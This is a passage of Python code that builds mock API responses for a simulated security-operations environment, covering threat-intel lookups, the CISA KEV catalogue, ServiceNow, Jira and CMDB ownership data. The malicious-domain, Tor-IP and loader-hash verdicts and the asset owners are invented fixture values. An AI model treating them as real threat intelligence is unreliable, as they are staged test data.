                         select={"from": "params.cve", "list": "data", "key": "cve", "split": ","})])


def cisa_kev() -> None:
    write("cisa_kev", [route("GET", r"known_exploited_vulnerabilities.json$", {
        "catalogVersion": "2026.09.20", "vulnerabilities": [
            {"cveID": c, "vendorProject": m["product"].split()[0], "product": m["product"], "vulnerabilityName": m["desc"],
             "dateAdded": "2026-09-19" if c == "CVE-2024-21412" else "2023-10-10", "dueDate": "2026-10-10",
             "requiredAction": "Apply mitigations per vendor instructions.",
             "knownRansomwareCampaignUse": "Known" if c == "CVE-2021-44228" else "Unknown"}
            for c, m in CVES.items() if m["kev"]]})])


def threat_intel() -> None:
    dom, udom, ip = PHISH["sender_domain"], PHISH["url_domain"], TOR_IP
    bad = {"last_analysis_stats": {"malicious": 14, "suspicious": 3, "harmless": 50, "undetected": 20}}
    write("threat_intel", [
        route("GET", rf"^/vt/api/v3/domains/({dom}|{udom})$", {"data": {"attributes": bad}}),
        route("GET", rf"^/vt/api/v3/ip_addresses/{ip}$", {"data": {"attributes": {
            "last_analysis_stats": {"malicious": 9, "suspicious": 2, "harmless": 60, "undetected": 20}}}}),
        route("GET", rf"^/vt/api/v3/files/{PAYLOAD_SHA}$", {"data": {"attributes": {
            "last_analysis_stats": {"malicious": 38, "suspicious": 0, "harmless": 0, "undetected": 30}}}}),
        route("GET", r"^/vt/api/v3/urls/aHR0cHM6Ly9sb2dpbi5taWNyb3MwZnQ", {"data": {"attributes": bad}}),
        route("GET", r"^/vt/", {"data": {"attributes": {"last_analysis_stats": {"malicious": 0, "harmless": 70,
                                                                                "undetected": 10}}}}),
        route("GET", r"^/abuseipdb/api/v2/check$", {"data": {"abuseConfidenceScore": 100, "totalReports": 1840,
                                                             "isp": "Tor exit", "isTor": True}}, params={"ipAddress": ip}),
        route("GET", r"^/abuseipdb/api/v2/check$", {"data": {"abuseConfidenceScore": 0, "totalReports": 0}}),
        route("GET", rf"^/otx/api/v1/indicators/.*({dom}|{udom}|{ip}|{PAYLOAD_SHA})", {"pulse_info": {"count": 4}}),
        route("GET", r"^/otx/", {"pulse_info": {"count": 0}}),
        route("POST", r"^/urlhaus/v1/", {"query_status": "ok", "threat": "phishing", "url_status": "online"},
              body_contains="micros0ft"),
        route("POST", r"^/urlhaus/v1/", {"query_status": "no_results"}),
        route("POST", r"^/threatfox/api/v1/$", {"query_status": "ok", "data": [
            {"malware_printable": "Unknown Loader", "threat_type": "payload_delivery"}]}, body_contains=PAYLOAD_SHA),
        route("POST", r"^/threatfox/api/v1/$", {"query_status": "no_result", "data": "no results"}),
        route("POST", r"^/malwarebazaar/api/v1/$", {"query_status": "ok", "data": [
            {"signature": "PowerShell Loader", "file_type": "ps1"}]}, body_contains=PAYLOAD_SHA),
        route("POST", r"^/malwarebazaar/api/v1/$", {"query_status": "hash_not_found"}),
        route("GET", rf"^/greynoise/v3/community/{ip}$", {"noise": True, "riot": False, "classification": "malicious",
                                                          "name": "Tor exit node"}),
        route("GET", r"^/greynoise/v3/community/", {"noise": False, "riot": False, "classification": "unknown"}),
        route("GET", r"^/shodan/shodan/host/", {"ports": [22, 80, 443, 9001], "org": "Tor relay", "tags": ["tor"]}),
    ])


def servicenow() -> None:
    specs = [("web01", "Anil Rao", "Web Platform", "Production", "1 - most critical", "Kolkata DC1"),
             ("db01", "Sunita Iyer", "Windows Server Team", "Production", "1 - most critical", "Kolkata DC1"),
             ("fs01", "Sunita Iyer", "Windows Server Team", "Production", "2 - somewhat critical", "Kolkata DC1"),
             ("jane", "Jane Doe", "End User Computing", "Corporate", "3 - less critical", "Kolkata HQ"),
             ("bob", "Bob Lee", "End User Computing", "Corporate", "3 - less critical", "Kolkata HQ")]
    cis = [{"sys_id": f"ci-{k}", "name": HOSTS[k]["hostname"], "fqdn": HOSTS[k]["fqdn"], "ip_address": HOSTS[k]["ip"],
            "os": HOSTS[k]["os"], "serial_number": HOSTS[k]["serial"], "owned_by": {"display_value": owner},
            "support_group": {"display_value": team}, "environment": env, "business_criticality": crit,
            "location": {"display_value": loc}, "sys_updated_on": f"{D}02:00:00"}
           for k, owner, team, env, crit, loc in specs]
    routes = [route("GET", r"^/api/now/table/cmdb_ci_computer$", {"result": [c]}, params={"sysparm_query": f"name={c['name']}"})
              for c in cis]
    routes += [route("GET", r"^/api/now/table/cmdb_ci_computer$", {"result": []}, params={"sysparm_query": "*"}),
               route("GET", r"^/api/now/table/cmdb_ci_computer$", {"result": cis}),
               route("POST", r"^/api/now/table/(incident|sn_vul_vulnerable_item)$",
                     {"result": {"sys_id": "sn-sys-0001", "number": "INC0012001"}}),
               route("GET", r"^/api/now/table/incident/sn-sys-0001$", {"result": {
                   "number": "INC0012001", "state": "2", "assignment_group": {"display_value": "Web Platform"},
                   "sys_updated_on": f"{D}12:00:00"}}),
               route("GET", r"^/api/now/table/incident$", {"result": []})]
    write("servicenow", routes)


def jira() -> None:
    write("jira", [route("POST", r"^/rest/api/3/issue$", {"id": "10001", "key": "SEC-101"}),
                   route("GET", r"^/rest/api/3/search/jql$", {"issues": [], "isLast": True})])


def cmdb_csv() -> None:
    write("cmdb_csv", [route("GET", r"^/ownership$", {"rows": [
        {"hostname": "web*", "owner": "Anil Rao", "platform_team": "Web Platform", "environment": "Production",
         "criticality": "critical"},
        {"hostname": "db*", "owner": "Sunita Iyer", "platform_team": "Windows Server Team", "environment": "Production",
         "criticality": "critical"},
        {"hostname": "fs*", "owner": "Sunita Iyer", "platform_team": "Windows Server Team", "environment": "Production",
         "criticality": "high"},
        {"hostname": "*-lt*", "owner": "", "platform_team": "End User Computing", "environment": "Corporate",
         "criticality": "medium"},
        {"hostname": "", "subscription": "sub-001", "owner": "Ravi Nair", "platform_team": "Cloud Platform",
         "environment": "Production", "criticality": "high"}]})])


def sentinel() -> None:
    write("sentinel", [route("GET", r"/incidents$", {"value": []})])


def generic_siem() -> None:
    write("generic_siem", [])


BUILDERS = [defender_endpoint, defender_office365, entra, rapid7, wiz, umbrella, canary, delinea_secret_server,
            delinea_privilege_manager, avanan, nvd, epss, cisa_kev, threat_intel, servicenow, jira, cmdb_csv,
            sentinel, generic_siem]
